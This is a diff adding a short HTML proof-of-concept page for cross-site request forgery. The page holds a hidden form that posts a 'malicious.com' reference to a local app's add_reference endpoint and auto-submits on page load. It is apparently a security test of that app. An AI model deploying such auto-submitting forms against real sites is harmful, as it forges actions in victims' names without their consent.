@@ -1,0 +1,10 @@
+<html>
+<body>
+    <form action="http://127.0.0.1:5000/add_reference" method="POST">
+        <input type="hidden" name="title" value="CSRF Attack">
+        <input type="hidden" name="url" value="https://malicious.com">
+        <input type="submit" value="Submit Form">
+    </form>
+    <script>document.forms[0].submit();</script>
+</body>
+</html>
